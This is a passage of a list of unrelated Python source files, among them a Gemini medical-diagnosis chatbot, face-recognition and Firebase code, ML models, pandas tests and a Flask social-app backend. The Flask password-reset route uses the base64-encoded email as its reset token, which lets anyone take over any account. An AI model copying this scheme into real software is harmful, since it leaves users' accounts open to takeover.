fetching google_search tool: {e}\")\n            #logger.error(f\"Error fetching user from DB: {e}\")\n\n\n    def gemini(self, message):\n\n        try:\n            google_tool = self.google_search()\n            input = f\"\"\"Diagnose and suggest remedies for this user's codition. Through active listening and follow-up questions, gather detailed information about the user's symptoms to determine the specific condition. Ask probing questions, just like a doctor would, to pinpoint the exact ailment before providing potential diagnoses. keep your response consice and well structured.\n                                            User: {message} \n                                            Medical chatbot: \"\"\"\n                \n            llm = ChatGoogleGenerativeAI(temperature=0.1, model=\"gemini-pro\", google_api_key=gemini_api_key)\n            prompt = ChatPromptTemplate.from_messages(\n                [\n                    MessagesPlaceholder(variable_name=\"chat_history\"),\n                    (\"user\", \"{input}\"),\n                    MessagesPlaceholder(variable_name=\"agent_scratchpad\"),\n                ]\n            )\n\n            llm_with_tools = llm.bind(functions=google_tool)\n            agent = self.creat_agent(prompt, llm_with_tools)\n            run = self.run_agent(agent, google_tool, message, input)\n            return run\n        \n        except Exception as e:\n            print(f\"Error exceuting code: {e}\")\n            return \"Error executing your request, try again\"\n\n\n\n    def creat_agent(self, prompt, llm_with_tools):\n\n        try:\n            agent = (\n                {\n                    \"input\":lambda x: x[\"input\"],\n                    \"chat_history\":lambda x: x[\"chat_history\"],\n                    \"agent_scratchpad\": lambda x: format_to_openai_function_messages(\n                        x[\"intermediate_steps\"]\n                    ),\n                }\n                | promp",
    "import cv2\nimport face_recognition\nimport pickle\nimport os\nimport firebase_admin\nfrom firebase_admin import credentials\nfrom firebase_admin import db\nfrom firebase_admin import  storage\nimport json\nfrom data import data\n# cred = credentials.Certificate(\"serviceAccountKey.json\")\n# firebase_admin.initialize_app(cred, {\n#     'databaseURL': \"https://face-recog-196bc-default-rtdb.firebaseio.com/\",\n#     'storageBucket': \"face-recog-196bc.appspot.com\"\n# })\ndef encodegenerator():\n    # Importing student images\n    folderPath = '../Image/'\n    pathList = os.listdir(folderPath)\n    print(pathList)\n    imgList = []\n    studentIds = []\n    for path in pathList:\n        imgList.append(cv2.imread(os.path.join(folderPath, path)))\n        studentIds.append(os.path.splitext(path)[0])\n\n        # fileName = f'{folderPath}/{path}'\n        fileName = os.path.join(folderPath, path)\n        bucket = storage.bucket()\n        blob = bucket.blob(f'Image/{path}')\n        blob.upload_from_filename(fileName)\n    \n    print(fileName)\n\n    print(studentIds)\n\n\n    def findEncodings(imagesList):\n        encodeList = []\n        for img in imagesList:\n            img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n            encode = face_recognition.face_encodings(img)[0]\n            encodeList.append(encode)\n\n        return encodeList\n\n\n    print(\"Encoding Started ...\")\n    encodeListKnown = findEncodings(imgList)\n    encodeListKnownWithIds = [encodeListKnown, studentIds]\n    print(\"Encoding Complete\")\n\n    file = open(\"../EncodeFile.p\", 'wb')\n    pickle.dump(encodeListKnownWithIds, file)\n    file.close()\n    print(\"File Saved\")\n\n    return encodeListKnownWithIds\n\n\n\ndef adddatatodatabase():\n    # cred = credentials.Certificate(\"../serviceAccountKey.json\")\n    # firebase_admin.initialize_app(cred, {\n    #     'databaseURL': \"https://face-recog-196bc-default-rtdb.firebaseio.com/\",\n    # })\n    ref = db.reference('Student')\n    for key, value in data.items():\n        # Check if the key already exists\n        if not ref.child(key).get():\n            # If the key doesn't exist, add the data\n            ref.child(key).set(value)\n    return \"Data added to database\"\n\n# def add_item(new_data):\n#     with open('data.py', 'r') as f:\n#         lines = f.readlines()\n\n#     if lines:\n#         lines.pop()\n\n#     # Write the modified lines back to the file\n#     with open('data.py', 'w') as f:\n#         f.writelines(lines)\n    \n#     with open('data.py', 'a') as f:\n#         f.write(',')\n#         a = json.dumps(new_data, indent=4)\n#         f.write(a[1:])",
    "from typing import List, Optional\nimport requests\nimport datetime\nimport logging\n\n\nclass AuthError(Exception):\n    def __init__(self):\n        super().__init__(\"Failed to authenticate\")\n\n\nclass API:\n    def __init__(\n        self,\n        username: str,\n        password: str,\n        hostname: str = \"https://api.godspeedapp.com\",\n    ):\n        self.hostname = hostname\n        self.token = None\n\n        try:\n            auth_result = self._send_post_request(\n                \"/sessions/sign_in\",\n                {\n                    \"email\": username,\n                    \"password\": password,\n                },\n            ).json()\n            is_success = auth_result[\"success\"] == True\n\n        except:\n            raise AuthError()\n\n        if not is_success:\n            raise AuthError()\n\n        self.token = auth_result[\"token\"]\n\n    def create_task(\n        self,\n        title: str,\n        list_id: Optional[str] = None,\n        location: Optional[str] = None,\n        notes: Optional[str] = None,\n        due_at: Optional[datetime.datetime] = None,\n        label_names: Optional[List[str]] = None,\n    ) -> dict:\n        str_date_time = due_at.strftime(\"%Y-%m-%dT%H:%M:%SZ\") if due_at else None\n\n        args = {\n            \"title\": title,\n            \"list_id\": list_id,\n            \"location\": location,\n            \"notes\": notes,\n            \"due_at\": str_date_time,\n            \"label_names\": label_names,\n        }\n\n        args = {k: v for k, v in args.items() if v is not None}\n\n        return self._send_post_request(\"/tasks\", args).json()\n\n    def _send_post_request(\n        self,\n        endpoint: str,\n        body: dict,\n    ) -> requests.Response:\n        headers = {}\n\n        if self.token:\n            headers[\"Authorization\"] = \"Bearer \" + self.token\n\n        res = requests.post(self.hostname + endpoint, json=body, headers=headers)\n        logging.info(f\"POST {self.hostname + endpoint} {body} {res.status_code}\")\n\n        return res\n",
    "def clean(input):\n    op = ['+', '-', '*', '/', '=']\n    input = [i.strip() for i in input]\n    input = [i for i in input if len(i) > 0]\n\n    new_input = []\n    for i in input:\n        split_i = []\n        i = i.replace(\" \", '')\n        temp_str = \"\"\n        for s in i:\n            if s in op:\n                split_i.append(temp_str)\n                split_i.append(s)\n                temp_str = \"\"\n                continue\n            temp_str += s\n\n        split_i.append(temp_str)\n\n        new_input.append(split_i)\n    return new_input\n\ndef remove_common_subexpression(input):\n    new_expressions = []\n    changed = set([])\n    encountered = set([])\n\n    for i in range(len(input)):\n        curr = input[i]\n        encountered.add(curr[0])\n\n        if (curr[2] not in encountered) or (curr[4] not in encountered):\n            new_expressions.append(curr)\n            encountered.add(curr[2])\n            encountered.add(curr[4])\n            changed.add(curr[0])\n            if curr[2] in changed:\n                changed.remove(curr[2])\n            if curr[4] in changed:\n                changed.remove(4)\n            continue\n\n        if (curr[2] in changed) or (curr[4] in changed):\n            new_expressions.append(curr)\n            changed.add(curr[0])\n            if curr[2] in changed:\n                changed.remove(curr[2])\n            if curr[4] in changed:\n                changed.remove(4)\n            continue\n\n        j = i-1\n        while(j >= 0):\n            expr = new_expressions[j]\n            if curr[2] == expr[2] and curr[3] == expr[3] and curr[4] == expr[4]:\n                curr[2] = expr[0]\n                curr[3] = ''\n                curr[4] = ''\n                break\n\n            j -= 1\n\n        new_expressions.append(curr)\n        changed.add(curr[0])\n        if curr[2] in changed:\n            changed.remove(curr[2])\n        if curr[4] in changed:\n            changed.remove(curr[4])\n\n    new_expressions = [\" \".join(expr) for expr in new_expressions]\n    res = \"\\n\".join(new_expressions)\n    return res\n\ninput_data = []\nprint(\"Enter all expressions, write 'end' when finished\")\nwhile True:\n    user_input = input()\n    user_input.strip()\n    if user_input.lower() == \"end\":\n        break\n    input_data.append(user_input)\n\ncleaned_input = clean(input_data)\nprint(\"-------------Output--------------\")\nprint(remove_common_subexpression(cleaned_input))\n",
    "\"\"\"\nRandom world generator\n\"\"\"\nfrom __future__ import annotations\nimport argparse\nimport math\nfrom pathlib import Path\nimport random\nfrom jinja2 import Environment, FileSystemLoader\n\n__authors__ = \"David Ho, Pedro Arias Perez\"\n__license__ = \"BSD-3-Clause\"\n\n\ndef distance(point1: tuple[float, float], point2: tuple[float, float]) -> float:\n    \"\"\"\n    Calculate the euclidean distance between 2 points\n    \"\"\"\n    return math.sqrt((point1[0] - point2[0]) ** 2 + (point1[1] - point2[1]) ** 2)\n\n\n# def randomize_drone_pose(id: int, upper: int, lower: int) -> dict[str, list]:\n#     \"\"\"\n#     Generate a random drone position within a [lower, upper] range\n#     \"\"\"\n#     if upper < lower:\n#         raise ValueError\n#     x = round(random.uniform(lower, upper), 2)\n#     y = round(random.uniform(lower, upper), 2)\n#     yaw = round(random.uniform(0, 2 * math.pi), 2)\n\n#     drone = {\n#         \"name\": f'\"drone{id}\"',\n#         \"xyz\": [x, y, 0],\n#         \"rpy\": [0, 0, yaw],\n#     }\n#     return drone\n\ndef generate_drone_row(num_drones: int) -> list[dict[str, list]]:\n    \"\"\"\n    Generate a row of drones\n    \"\"\"\n    drones = []\n    x, y = 0, 0\n    yaw = 0.0\n    for i in range(num_drones):\n        drone = {\n            \"name\": f'\"drone{i}\"',\n            \"xyz\": [x, y, 0],\n            \"rpy\": [0, 0, yaw],\n        }\n        drones.append(drone)\n        y = y + 2.0\n    return drones\n\n\ndef generate_panel_rows(num_rows: int, num_panels: int) -> dict[str, list[float]]:\n    \"\"\"\n    Given drone coordinates, generate random panels outside the grid\n\n    drone_coords = (x, y)\n    min_distance = minimum distance away from drone\n    \"\"\"\n\n    panels = {}\n    x = 20  # Initial x position\n    y = 0  # Initial y position\n    for i in range(num_rows):\n        for j in range(num_panels):\n            displacement = 3.5\n            panels[f\"panel{j+i*num_panels}\"] = [x, y +\n                                                displacement, 0.45, 0, 0.60, 3.14]\n            y = y + displacement\n        x = x + 3.5\n        y = 0\n    return panels\n\n\ndef generate_world(world_name: str, num_panels: int, num_rows: int, num_drones: int) -> None:\n    \"\"\"Generate world\"\"\"\n    assets_path = Path(__file__).parents[1].joinpath(\n        'assets')\n    environment = Environment(loader=FileSystemLoader(\n        assets_path.joinpath(\"templates\")))\n\n    json_template = environment.get_template(\"drone.json.jinja\")\n    sdf_template = environment.get_template(\"world.sdf.jinja\")\n    # initial_grid_size = 10\n\n    world_name = f\"{world_name}\"\n    drones = generate_drone_row(num_drones)\n\n    obstacles = generate_panel_rows(num_rows=num_rows,\n                                    num_panels=num_panels)\n\n    json_output = json_template.render(\n        world_name=world_name, drones=drones)\n    sdf_output = sdf_template.render(\n        world_name=world_name, models=obstacles)\n\n    # if visualize:\n    #     visualize_world(world_name, {'drone': drone_xy},\n    #                     obstacles)\n\n    json_path = assets_path.joinpath(f\"worlds/{world_name}.json\")\n    sdf_path = assets_path.joinpath(f\"worlds/{world_name}.sdf\")\n\n    # Write the JSON string to the file\n    with open(json_path, \"w\", encoding='utf-8') as json_file:\n        json_file.write(json_output)\n\n    # Write the XML string to the file\n    with open(sdf_path, \"w\", encoding='utf-8') as sdf_file:\n        sdf_file.write(sdf_output)\n\n    print(f\"World {world_name} has been saved\")\n\n\ndef main():\n    \"\"\"\n    entrypoint\n    \"\"\"\n    parser = argparse.ArgumentParser(\n        description='Generate a randomize world as a json file')\n    parser.add_argument('number_of_drones', metavar='drones', type=int,\n                        help='number of drones to generate')\n    parser.add_argument('number_of_panels', metavar='panels', type=int,\n                        help='number of panels to generate')\n    parser.add_argument('number_of_rows', metavar='rows', type=int,\n                        help='number of rows of panels to generate')\n    parser.add_argument('-name', '--world_name', metavar='name', type=str, nargs='?',\n                        default='solar_field', help='generic name of generated world')\n    args = parser.parse_args()\n\n    num_drones = args.number_of_drones    # Number of Drones\n    num_obj = args.number_of_panels    # Number of panels\n    num_rows = args.number_of_rows    # Number of rows\n    world_name = args.world_name\n\n    print(num_rows)\n\n    generate_world(world_name, num_obj, num_rows, num_drones)\n\n\nif __name__ == '__main__':\n    main()\n",
    "def solve_equation3 ( a , b , c , d ) :\n    delta =  18 * a * b * c * d - 4 * b ** 3 * d + b ** 2 * c ** 2 - 4 * a * c ** 3 - 27 * a ** 2 * d ** 2\n    \n    delta_0 = b ** 2 - 3 * a * c\n    delta_1 = 2*b ** 3 - 9 * a * b * c + 27 * a ** 2 * d    \n    delta_2 = -27 * a ** 2 * delta\n\n    C = ( (delta_1 + delta_2 ** 0.5 ) / 2) ** (1/3)\n\n    z = complex ( -1 ,  3 ** 0.5)\n    u1 = 1\n    u2 = complex ( -1 ,  3 ** 0.5) / 2 \n    u3 = complex ( -1 ,  -(3 ** 0.5)) /2\n\n    if delta == 0 :\n        x_1 = - ( b ) / ( 3 * a )\n        print (\"X_1 =\" , x_1)\n\n    else :\n\n\n        x_1 =  - ( b + C * u1  + delta_0 / (C * u1) ) / ( 3 * a )\n        x_2 =  - ( b + C * u2  + delta_0 / (C * u2) ) / ( 3 * a )\n        x_3 =  - ( b + C * u3  + delta_0 / (C * u3) ) / ( 3 * a )\n\n        print (\"X_1 =\" , x_1)\n        print (\"X_2 =\" , x_2)\n        print (\"X_3 =\" , x_3)\n\na = int (input (\"enter a  number as coefficient of x^3   \"))\nb = int (input (\"enter a  number as coefficient of x^2   \"))\nc = int (input (\"enter a  number as coefficient of x   \"))\nd = int (input (\"enter a  number as fixed coefficient   \"))\nsolve_equation3 ( a , b , c , d)",
    "from functools import wraps\nimport os\nimport re\nfrom flask_mail import Message, Mail\nimport base64 \nfrom flask import (request,jsonify, abort, send_from_directory, g)\nfrom flask_jwt_extended import (create_access_token, get_jwt_identity, jwt_required)\nfrom flask_socketio import (emit, send)\nfrom werkzeug.security import (check_password_hash, generate_password_hash)\nfrom werkzeug.utils import (secure_filename)\nfrom models.model import (db, User, Post, Message, Liked_Post, Comment, Follow, Role, Permission)\nfrom utils import create_app,allowed_file\nfrom helper import ROLES_PERMISSIONS\nfrom handlers import (bad_request, forbidden, unauthorized, not_found)\n\napp, socketio = create_app()\nmail = Mail(app)\nemail_validation = r'^[a-zA-Z0-9+_.-]+@[a-zA-Z0-9.-]+$'\n\napp.errorhandler(400)(bad_request)\napp.errorhandler(401)(unauthorized)\napp.errorhandler(403)(forbidden)\napp.errorhandler(404)(not_found)\n\ndef secure_password(password):\n    return generate_password_hash(password)    \n\ndef roles_required(*roles):\n    def wrapper(fn):\n        @wraps(fn)\n        def decorated_view(*args, **kwargs):\n            current_user_id = get_jwt_identity()\n            user = User.query.get(current_user_id)\n            if user.role not in roles:\n                abort(403, 'Insufficient permissions')\n            return fn(*args, **kwargs)\n        return decorated_view\n    return wrapper\n\n@app.route('/register', methods=['POST'])\ndef register():\n    data = request.json\n    if 'profile_picture' in request.files:\n        profile_picture = request.files['profile_picture']\n        if profile_picture and allowed_file(profile_picture.filename):\n            filename = secure_filename(profile_picture.filename)\n            profile_picture.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n            data['profile_picture'] = filename\n\n    if not re.match(email_validation, data.get('email')):\n        return jsonify({'message': 'Enter a valid email'}), 400\n\n    if not data.get('username') or not data.get('email') or not data.get('password'):\n        abort(400, 'missing required details')\n\n    user = User.query.filter_by(username=data.get('username'), email=data.get('email')).first()\n\n    if user:\n        return jsonify({'message': \"User already registered\"}), 400\n\n    hashed_password = generate_password_hash(data.get('password'))\n\n    new_user = User(\n        username=data.get('username'),\n        email=data.get('email'),\n        password=hashed_password,\n        profile_picture=data.get('profile_picture')\n    )\n\n    db.session.add(new_user)\n    db.session.commit()\n\n    return jsonify({'message': 'User registered successfully'}), 201\n\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.json\n\n    if not data.get('username') or not data.get('password'):\n        abort(400, 'Missing required details')\n\n    user = User.query.filter_by(username=data.get('username')).first()\n\n    if not user or not check_password_hash(user.password, data['password']):\n        abort(401, 'Invalid username or password')\n\n    access_token = create_access_token(identity=user.id)\n\n    return jsonify(access_token=access_token), 200\n\n@app.route('/forgot_password', methods=['POST'])\ndef forgot_password():\n    data = request.get_json()\n    email = data['email']\n    user = User.query.filter_by(email=email).first()\n    \n    if user:\n        reset_token = base64.b64encode(email.encode('utf-8')).decode('utf-8')\n\n        send_reset_password_email(email, reset_token)\n\n        return jsonify({'message': 'Reset password link sent to your email'})\n    else:\n        return jsonify({'message': 'User not found'}), 404\n\ndef send_reset_password_email(user_email, reset_token):\n    msg = Message('Reset Your Password', sender=os.getenv('MAIL_USERNAME'), recipients=[user_email])\n    msg.body = f'Reset your password: {reset_token}'\n    mail.send(msg)\n\n\n@app.route('/reset_password/<token>', methods=['POST'])\ndef reset_password(token):\n   \n    data = request.get_json()\n    new_password = data['new_password']\n    confirm_password = data['confirm_password']\n    \n    if new_password != confirm_password:\n        return jsonify({'message': 'New password and confirm password do not match'}), 400\n\n    email = base64.b64decode(token).decode('utf-8')\n    \n    user = User.query.filter_by(email=email).first()\n    if user:\n        user.password = generate_password_hash(new_password)\n        db.session.commit()\n        return jsonify({'message': 'Password reset successfully'}), 200\n    else:\n        return jsonify({'message': 'User not found'}), 404\n\n\n@app.route('/profile/picture', methods=['PUT'])\n@jwt_required()\ndef update_profile_picture():\n    current_user_id = get_jwt_identity()\n    user = User.query.get(current_user_id)\n\n    if not user:\n        abort(404, 'user not found')\n\n    if 'profile_picture' in request.files:\n        profile_picture = request.files['profile_picture']\n        if profile_picture and allowed_file(profile_picture.filename):\n            filename = secure_filename(",
    "#RLPD\n\nimport functools\nfrom typing import Optional, Type\n\nimport tensorflow_probability\n\ntfp = tensorflow_probability.substrates.jax\ntfd = tfp.distributions\ntfb = tfp.bijectors\n\nimport flax.linen as nn\nimport jax.numpy as jnp\n\nfrom .model import default_init\n\nfrom typing import Any, Optional\n\n\nclass TanhTransformedDistribution(tfd.TransformedDistribution):\n    def __init__(self, distribution: tfd.Distribution, validate_args: bool = False):\n        super().__init__(\n            distribution=distribution, bijector=tfb.Tanh(), validate_args=validate_args\n        )\n\n    def mode(self) -> jnp.ndarray:\n        return self.bijector.forward(self.distribution.mode())\n\n    @classmethod\n    def _parameter_properties(cls, dtype: Optional[Any], num_classes=None):\n        td_properties = super()._parameter_properties(dtype, num_classes=num_classes)\n        del td_properties[\"bijector\"]\n        return td_properties\n\n\nclass Normal(nn.Module):\n    base_cls: Type[nn.Module]\n    action_dim: int\n    log_std_min: Optional[float] = -20\n    log_std_max: Optional[float] = 2\n    state_dependent_std: bool = True\n    squash_tanh: bool = False\n\n    @nn.compact\n    def __call__(self, inputs, *args, **kwargs) -> tfd.Distribution:\n        x = self.base_cls()(inputs, *args, **kwargs)\n\n        means = nn.Dense(\n            self.action_dim, kernel_init=default_init(), name=\"OutputDenseMean\"\n        )(x)\n        if self.state_dependent_std:\n            log_stds = nn.Dense(\n                self.action_dim, kernel_init=default_init(), name=\"OutputDenseLogStd\"\n            )(x)\n        else:\n            log_stds = self.param(\n                \"OutpuLogStd\", nn.initializers.zeros, (self.action_dim,), jnp.float32\n            )\n\n        log_stds = jnp.clip(log_stds, self.log_std_min, self.log_std_max)\n\n        distribution = tfd.MultivariateNormalDiag(\n            loc=means, scale_diag=jnp.exp(log_stds)\n        )\n\n        if self.squash_tanh:\n            return TanhTransformedDistribution(distribution)\n        else:\n            return distribution\n\n\nTanhNormal = functools.partial(Normal, squash_tanh=True)",
    "from typing import ParamSpecKwargs\nimport torch\nimport torch.nn as nn\nimport math\nfrom einops import rearrange, repeat\nfrom x_transformers import Encoder\nfrom models.revIN import RevIN\n'''\nFuture embedding strategies:\n1) patchify each chanel into several tokens, concat tokens\n2) make spectrogram, then pass to vit or CNN\n'''\n\n\n'''\nFuture embedding strategies:\n1) patchify each chanel into several tokens, concat tokens\n2) make spectrogram, then pass to vit or CNN\n'''\n\n\nclass Embedding(nn.Module):\n    def __init__(self, input_size, embed_dim):\n        super().__init__()\n        self.embed = nn.Sequential(\n            nn.Linear(input_size, embed_dim),\n            nn.LayerNorm(embed_dim)\n        )\n\n    def forward(self, x):\n        x = x.float()\n        return self.embed(x)\n\nclass PatchTSTEncoder(nn.Module):\n    def __init__(self, seq_len,  num_channels, embed_dim, heads, depth, patch_len=8, dropout=0.0, embed_strat='patch'):\n        super().__init__()\n        self.embed_dim = embed_dim\n        self.num_channels = num_channels\n        self.heads = heads\n        self.depth = depth\n        self.seq_len = seq_len\n        self.patch_len = patch_len\n        self.dropout = dropout\n        self.embed_strat = embed_strat\n        \n        if self.embed_strat == 'patch':\n          # learnable embeddings for each channel\n          self.embed = Embedding(patch_len, embed_dim)\n          # learnable positional encoding\n          self.pe = nn.Parameter(torch.randn(1, (seq_len // patch_len), embed_dim))\n\n        elif self.embed_strat == 'learned_table':\n          self.embed = nn.Embedding(num_embeddings=2001, embedding_dim=embed_dim)\n          self.pe = nn.Parameter(torch.randn(1, seq_len, embed_dim))\n        \n        elif self.embed_strat == 'naive_linear':\n          self.embed = nn.Linear(1, embed_dim)\n          self.pe = nn.Parameter(torch.randn(1, seq_len, embed_dim))\n\n        else:\n          pass\n        # transformer encoder\n        self.encoder = Encoder(\n            dim = embed_dim,\n            depth = depth,\n            heads = heads,\n            dropout = self.dropout,\n            sandwich_norm = True\n        )\n\n    '''\n    patchify each channel into several tokens,\n    '''\n    def patchify(self, x):\n        # shape x: (batch_size, seq_len, num_channels)\n        x = rearrange(x, 'b (s patch_len) c -> b c s patch_len', patch_len=self.patch_len)\n        return x \n\n    def forward(self, x):\n        # instance norm\n        if self.embed_strat == 'patch':\n          # if ssl we do everything separately\n          x = self.patchify(x)\n        elif self.embed_strat == 'learned_table':\n          # Clip the tensor to the range [-1, 1]\n          x = torch.clamp(x, min=-1, max=1)\n          # Add 1 to x, then multiply by 1000\n          x = x * 1000\n          # Now x is in the range [0, 2000]\n          # Convert to integers\n          x = x % 2000\n          x = x.long()\n        elif self.embed_strat == 'naive_linear':\n          x = x.float()\n          x = x.unsqueeze(-1)    \n\n        # embed tokens\n        x = self.embed(x)\n\n        if self.embed_strat == 'patch':\n          # reshape for transformer so that channels are passed independently\n          x = rearrange(x, 'b c num_patch emb_dim -> (b c) num_patch emb_dim')\n        elif self.embed_strat == \"learned_table\" or self.embed_strat == 'naive_linear':\n        # apply positional encoding on last 2 dims\n          x = rearrange(x, 'b seq_len c emb_dim -> (b c) seq_len emb_dim')\n\n        x = x + self.pe\n\n        x = self.encoder(x)\n\n        if self.embed_strat == 'patch':\n          x = rearrange(x, '(b c) num_patch emb_dim -> b c num_patch emb_dim', c=self.num_channels)\n        else:\n          x = rearrange(x, '(b c) seq_len emb_dim -> b c seq_len emb_dim', c=self.num_channels)\n\n        return x\n     \nclass PatchTSTDecoder(nn.Module):\n    def __init__(self, num_patches, num_channels, embed_dim, target_seq_size, patch_len=8, dropout=0.0, embed_strat='patch'):\n        super().__init__()\n        self.embed_dim = embed_dim\n        self.num_channels = num_channels\n        self.patch_len = patch_len\n        self.dropout = dropout\n        self.target_seq_size = target_seq_size\n        self.num_patches = num_patches\n        self.embed_strat = embed_strat\n\n        self.flatten = nn.Flatten(start_dim=-2)\n        self.linear = nn.Linear(int(embed_dim * num_patches), self.target_seq_size)\n        self.dropout = nn.Dropout(dropout)\n    \n    def forward(self, x):\n        x = self.flatten(x)\n        x = self.linear(x)\n        x = self.dropout(x)\n        return x\n\n\nclass PatchTST(nn.Module):\n    def __init__(self, seq_len, num_channels, embed_dim, heads, depth, target_seq_size, patch_len=8, dropout=0.0, embed_strat='patch'):\n        super().__init__()\n        self.encoder = PatchTSTEncoder(seq_len, num_channels, embed_dim, heads, depth, patch_len, dropout, embed_strat)\n        if embed_strat == \"patch\":\n          self.decoder = PatchTSTDecoder(seq_len // patch_len, num_channels, embed_dim, target_seq_",
    "\"\"\"\nSee also: test_reindex.py:TestReindexSetIndex\n\"\"\"\n\nfrom datetime import (\n    datetime,\n    timedelta,\n)\n\nimport numpy as np\nimport pytest\n\nfrom pandas import (\n    Categorical,\n    DataFrame,\n    DatetimeIndex,\n    Index,\n    MultiIndex,\n    Series,\n    date_range,\n    period_range,\n    to_datetime,\n)\nimport pandas._testing as tm\n\n\nclass TestSetIndex:\n    def test_set_index_multiindex(self):\n        # segfault in GH#3308\n        d = {\"t1\": [2, 2.5, 3], \"t2\": [4, 5, 6]}\n        df = DataFrame(d)\n        tuples = [(0, 1), (0, 2), (1, 2)]\n        df[\"tuples\"] = tuples\n\n        index = MultiIndex.from_tuples(df[\"tuples\"])\n        # it works!\n        df.set_index(index)\n\n    def test_set_index_empty_column(self):\n        # GH#1971\n        df = DataFrame(\n            [\n                {\"a\": 1, \"p\": 0},\n                {\"a\": 2, \"m\": 10},\n                {\"a\": 3, \"m\": 11, \"p\": 20},\n                {\"a\": 4, \"m\": 12, \"p\": 21},\n            ],\n            columns=[\"a\", \"m\", \"p\", \"x\"],\n        )\n\n        result = df.set_index([\"a\", \"x\"])\n\n        expected = df[[\"m\", \"p\"]]\n        expected.index = MultiIndex.from_arrays([df[\"a\"], df[\"x\"]], names=[\"a\", \"x\"])\n        tm.assert_frame_equal(result, expected)\n\n    def test_set_index_empty_dataframe(self):\n        # GH#38419\n        df1 = DataFrame(\n            {\"a\": Series(dtype=\"datetime64[ns]\"), \"b\": Series(dtype=\"int64\"), \"c\": []}\n        )\n\n        df2 = df1.set_index([\"a\", \"b\"])\n        result = df2.index.to_frame().dtypes\n        expected = df1[[\"a\", \"b\"]].dtypes\n        tm.assert_series_equal(result, expected)\n\n    def test_set_index_multiindexcolumns(self):\n        columns = MultiIndex.from_tuples([(\"foo\", 1), (\"foo\", 2), (\"bar\", 1)])\n        df = DataFrame(\n            np.random.default_rng(2).standard_normal((3, 3)), columns=columns\n        )\n\n        result = df.set_index(df.columns[0])\n\n        expected = df.iloc[:, 1:]\n        expected.index = df.iloc[:, 0].values\n        expected.index.names = [df.columns[0]]\n        tm.assert_frame_equal(result, expected)\n\n    def test_set_index_timezone(self):\n        # GH#12358\n        # tz-aware Series should retain the tz\n        idx = DatetimeIndex([\"2014-01-01 10:10:10\"], tz=\"UTC\").tz_convert(\"Europe/Rome\")\n        df = DataFrame({\"A\": idx})\n        assert df.set_index(idx).index[0].hour == 11\n        assert DatetimeIndex(Series(df.A))[0].hour == 11\n        assert df.set_index(df.A).index[0].hour == 11\n\n    def test_set_index_cast_datetimeindex(self):\n        df = DataFrame(\n            {\n                \"A\": [datetime(2000, 1, 1) + timedelta(i) for i in range(1000)],\n                \"B\": np.random.default_rng(2).standard_normal(1000),\n            }\n        )\n\n        idf = df.set_index(\"A\")\n        assert isinstance(idf.index, DatetimeIndex)\n\n    def test_set_index_dst(self):\n        di = date_range(\"2006-10-29 00:00:00\", periods=3, freq=\"H\", tz=\"US/Pacific\")\n\n        df = DataFrame(data={\"a\": [0, 1, 2], \"b\": [3, 4, 5]}, index=di).reset_index()\n        # single level\n        res = df.set_index(\"index\")\n        exp = DataFrame(\n            data={\"a\": [0, 1, 2], \"b\": [3, 4, 5]},\n            index=Index(di, name=\"index\"),\n        )\n        exp.index = exp.index._with_freq(None)\n        tm.assert_frame_equal(res, exp)\n\n        # GH#12920\n        res = df.set_index([\"index\", \"a\"])\n        exp_index = MultiIndex.from_arrays([di, [0, 1, 2]], names=[\"index\", \"a\"])\n        exp = DataFrame({\"b\": [3, 4, 5]}, index=exp_index)\n        tm.assert_frame_equal(res, exp)\n\n    def test_set_index(self, float_string_frame):\n        df = float_string_frame\n        idx = Index(np.arange(len(df))[::-1])\n\n        df = df.set_index(idx)\n        tm.assert_index_equal(df.index, idx)\n        with pytest.raises(ValueError, match=\"Length mismatch\"):\n            df.set_index(idx[::2])\n\n    def test_set_index_names(self):\n        df = tm.makeDataFrame()\n        df.index.name = \"name\"\n\n        assert df.set_index(df.index).index.names == [\"name\"]\n\n        mi = MultiIndex.from_arrays(df[[\"A\", \"B\"]].T.values, names=[\"A\", \"B\"])\n        mi2 = MultiIndex.from_arrays(\n            df[[\"A\", \"B\", \"A\", \"B\"]].T.values, names=[\"A\", \"B\", \"C\", \"D\"]\n        )\n\n        df = df.set_index([\"A\", \"B\"])\n\n        assert df.set_index(df.index).index.names == [\"A\", \"B\"]\n\n        # Check that set_index isn't converting a MultiIndex into an Index\n        assert isinstance(df.set_index(df.index).index, MultiIndex)\n\n        # Check actual equality\n        tm.assert_index_equal(df.set_index(df.index).index, mi)\n\n        idx2 = df.index.rename([\"C\", \"D\"])\n\n        # Check that [MultiIndex, MultiIndex] yields a MultiIndex rather\n        # than a pair of tuples\n        assert isinstance(df.set_index([df.index, idx2]).index, MultiIndex)\n\n        # Check equality\n        tm.assert_index_equal(df.set_index([df.index, idx2]).index, mi2)\n\n    # A has duplicate values, C does not\n    @pytest.mark.parametrize(\"keys\", [\"A\", \"C\", [\"A\", \"B\"], (\"tuple\", \"as\", \"label\")])\n    @pytest.mark.para",
    "import streamlit as st\nimport rag\n\ndef chatbot_response(user_input):\n    # Here you would implement your chatbot logic to generate a response\n    # For simplicity, let's just echo the user's input\n    # st.write(ans)\n    return f\"You said: '{user_input}'\"\n\ndef main():\n    st.title(\"Quran Query Assistant\")\n\n    user_input = st.text_input(\"Enter your message here:\", key=\"user_input\")\n\n    if st.button(\"Submit\"):\n        if user_input:\n            # response = chatbot_response(user_input)\n            response = rag.answerable(user_input)\n            st.text_area(\"Response:\", value=response, height=100, key=\"bot_response\")\n\nif __name__ == \"__main__\":\n    main()\n\n\n\n# import streamlit as st\n# import rag\n\n# def chatbot_response(user_input):\n#     # Here you would implement your chatbot logic to generate a response\n#     # For simplicity, let's just echo the user's input\n#     #st.write(ans)\n#     return f\"You said: '{user_input}'\"\n\n# def main():\n#     st.title(\"Quran GPT\")\n\n#     st.sidebar.header(\"User Input\")\n#     user_input = st.sidebar.text_input(\"Enter your message here:\")\n\n#     if st.sidebar.button(\"Send\"):\n#         if user_input:\n#             #response = chatbot_response(user_input)\n#             response = rag.answerable(user_input)\n#             st.text_area(\"Bot Response:\", value=response, height=100)\n\n# if __name__ == \"__main__\":\n#     main()",
